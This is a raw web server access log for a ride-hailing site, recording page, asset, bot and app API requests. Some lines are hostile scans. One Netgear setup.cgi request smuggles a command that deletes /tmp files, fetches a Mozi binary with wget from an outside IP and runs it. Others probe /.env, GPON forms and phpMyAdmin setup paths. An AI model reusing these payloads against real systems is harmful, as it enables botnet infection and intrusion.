108.162.219.189 - - [02/Oct/2020:18:37:38 +0000] "POST /adminer.php HTTP/1.1" 302 - "http://getmeride.com/adminer.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.189 - - [02/Oct/2020:18:37:39 +0000] "GET /adminer.php?server=localhost&username=root HTTP/1.1" 200 9408 "http://getmeride.com/adminer.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:37:39 +0000] "GET /adminer.php?file=jush.js&version=4.6.2 HTTP/1.1" 200 82471 "http://getmeride.com/adminer.php?server=localhost&username=root" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:37:43 +0000] "GET /adminer.php?server=localhost&username=root&db=getme HTTP/1.1" 200 112962 "http://getmeride.com/adminer.php?server=localhost&username=root" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:37:44 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&script=db HTTP/1.1" 200 19986 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:37:48 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&table=settings HTTP/1.1" 200 25969 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:37:50 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&select=settings HTTP/1.1" 200 58103 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&table=settings" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.189 - - [02/Oct/2020:18:38:04 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:38:05 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:38:15 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=4 HTTP/1.1" 200 27457 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&select=settings" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:38:28 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&select=settings HTTP/1.1" 200 58106 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=4" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:38:31 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=2 HTTP/1.1" 200 27458 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&select=settings" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:38:39 +0000] "POST /adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=2 HTTP/1.1" 302 - "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=2" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:38:40 +0000] "GET /adminer.php?server=localhost&username=root&db=getme&select=settings HTTP/1.1" 200 58742 "http://getmeride.com/adminer.php?server=localhost&username=root&db=getme&edit=settings&where%5Bid%5D=2" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.189 - - [02/Oct/2020:18:38:43 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:38:43 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:38:43 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.125 - - [02/Oct/2020:18:38:44 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [02/Oct/2020:18:41:22 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:41:23 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.127 - - [02/Oct/2020:18:41:23 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "http://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [02/Oct/2020:18:41:24 +0000] "GET /asset/img/user-playstore.png HTTP/1.1" 304 - "http://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.68 - - [02/Oct/2020:18:41:24 +0000] "GET /asset/img/provider-appstore.png HTTP/1.1" 304 - "http://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.74 - - [02/Oct/2020:18:41:24 +0000] "GET /asset/img/provider-playstore.png HTTP/1.1" 304 - "http://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.168 - - [02/Oct/2020:18:41:24 +0000] "GET /asset/img/app-download-bg.jpg HTTP/1.1" 304 - "http://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
193.118.53.210 - - [02/Oct/2020:18:43:18 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:43:44 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:43:45 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:43:45 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.42 - - [02/Oct/2020:18:43:45 +0000] "GET /asset/img/support.png HTTP/1.1" 304 - "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.181 - - [02/Oct/2020:18:43:45 +0000] "GET /asset/img/user-appstore.png HTTP/1.1" 304 - "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.125 - - [02/Oct/2020:18:43:48 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:44:00 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:44:00 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:44:00 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:44:46 +0000] "GET /asset/js/jquery.min.map HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:45:00 +0000] "GET / HTTP/1.1" 200 27291 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:45:00 +0000] "GET / HTTP/1.1" 200 27291 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [02/Oct/2020:18:45:00 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:45:00 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.205 - - [02/Oct/2020:18:45:00 +0000] "GET /asset/js/jquery.min.map HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:45:02 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
81.101.99.22 - - [02/Oct/2020:18:46:13 +0000] "GET http://proxyjudge.us/judge.php HTTP/1.0" 404 1118 "-" "-"
108.162.219.175 - - [02/Oct/2020:18:46:37 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:46:57 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:18:47:17 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
45.6.87.90 - - [02/Oct/2020:18:49:14 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.6.87.90:57036/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1118 "-" "-"
108.162.219.175 - - [02/Oct/2020:18:49:20 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.104 - - [02/Oct/2020:18:49:39 +0000] "GET /public/logo-black.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.133 - - [02/Oct/2020:18:49:39 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "http://getmeride.com/public/logo-black.png" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
119.189.139.148 - - [02/Oct/2020:19:03:20 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1118 "-" "Hello, World"
162.158.63.101 - - [02/Oct/2020:19:09:24 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.138 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.162.219.133 - - [02/Oct/2020:19:09:46 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "-" "Googlebot-Image/1.0"
108.162.219.205 - - [02/Oct/2020:19:13:14 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
108.162.219.205 - - [02/Oct/2020:19:13:17 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
108.162.219.205 - - [02/Oct/2020:19:13:18 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
108.162.219.205 - - [02/Oct/2020:19:13:59 +0000] "POST /api/user/verify HTTP/1.1" 200 29 "-" "okhttp/3.12.1"
108.162.219.155 - - [02/Oct/2020:19:29:17 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
162.158.62.64 - - [02/Oct/2020:19:29:17 +0000] "GET /asset/js/jquery.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
108.162.219.155 - - [02/Oct/2020:19:29:17 +0000] "GET /asset/js/bootstrap.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
173.245.52.198 - - [02/Oct/2020:19:29:17 +0000] "GET /asset/js/scripts.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
173.245.52.204 - - [02/Oct/2020:19:29:17 +0000] "GET /asset/js/map.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
162.158.63.197 - - [02/Oct/2020:19:29:17 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36"
65.52.207.171 - - [02/Oct/2020:19:45:50 +0000] "GET /.env HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.52.207.171 - - [02/Oct/2020:19:45:50 +0000] "POST / HTTP/1.1" 405 10936 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
199.195.253.117 - - [02/Oct/2020:19:50:23 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 1118 "-" "ZmEu"
199.195.253.117 - - [02/Oct/2020:19:50:23 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
199.195.253.117 - - [02/Oct/2020:19:50:23 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
199.195.253.117 - - [02/Oct/2020:19:50:23 +0000] "GET /db/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
162.158.62.232 - - [02/Oct/2020:20:06:44 +0000] "POST //api/user/checkversion HTTP/1.1" 200 22 "-" "TranxitUser/3.5.1 (com.getme.user; build:1.2.1; iOS 13.6.0) Alamofire/4.9.1"
162.158.62.108 - - [02/Oct/2020:20:17:55 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.158.62.88 - - [02/Oct/2020:20:17:55 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
108.162.219.49 - - [02/Oct/2020:20:17:55 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.158.63.101 - - [02/Oct/2020:20:22:36 +0000] "GET / HTTP/1.1" 200 27291 "http://getmeride.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
162.158.63.125 - - [02/Oct/2020:20:22:36 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
108.162.219.133 - - [02/Oct/2020:20:22:36 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "http://getmeride.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
162.158.62.24 - - [02/Oct/2020:20:44:37 +0000] "GET / HTTP/1.1" 200 27291 "-" "Apache-HttpClient/4.5.6 (Java/1.8.0_112)"
108.162.219.133 - - [02/Oct/2020:20:44:52 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "-" "Googlebot-Image/1.0"
162.158.62.48 - - [02/Oct/2020:20:55:00 +0000] "GET /asset/img/taxi-car.png HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.141.50.85 - - [02/Oct/2020:21:08:24 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:24 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /db/scripts/setup.py HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /mysqladmin/scripts/setup.py HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /mysql/scripts/setup.py HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /myadmin/scripts/setup.py HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:25 +0000] "GET /phpMyAdmin-3.1.2.0-english/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:26 +0000] "GET /phpmyadmin1/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:26 +0000] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:26 +0000] "GET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:26 +0000] "GET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:26 +0000] "GET /admin/pma/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:27 +0000] "GET /database/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
209.141.50.85 - - [02/Oct/2020:21:08:27 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 1118 "-" "ZmEu"
162.158.62.148 - - [02/Oct/2020:21:09:52 +0000] "POST //api/user/checkversion HTTP/1.1" 200 22 "-" "TranxitUser/3.5.1 (com.getme.user; build:1.2.1; iOS 13.3.1) Alamofire/4.9.1"
108.162.219.205 - - [02/Oct/2020:21:51:37 +0000] "GET /provider/login HTTP/1.1" 200 3843 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
139.162.119.197 - - [02/Oct/2020:21:53:08 +0000] "GET / HTTP/1.1" 200 27220 "-" "HTTP Banner Detection (https://security.ipip.net)"
162.158.63.101 - - [02/Oct/2020:22:02:44 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.158.62.232 - - [02/Oct/2020:22:07:31 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.121 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/css/style.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.118 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.210 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/css/bootstrap.min.css HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.175 - - [02/Oct/2020:22:07:32 +0000] "GET /uploads/668ceb747b5e7b2440863aca942f5b15f13d6aec.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.48 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/destination.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.57 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/screen-bg.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.38 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/taxi-app.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.8 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/budget.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.117 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/screen-bg-3.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.211 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/car-wheel.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.187.128 - - [02/Oct/2020:22:07:32 +0000] "GET /asset/img/taxi-car.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.128 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/cost-cities.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.187 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/taxi-location.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.69 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/seat-belt.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.13 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/slider-bg-1.jpg HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.68 - - [02/Oct/2020:22:07:33 +0000] "GET /asset/img/behind-the-wheel.jpg HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
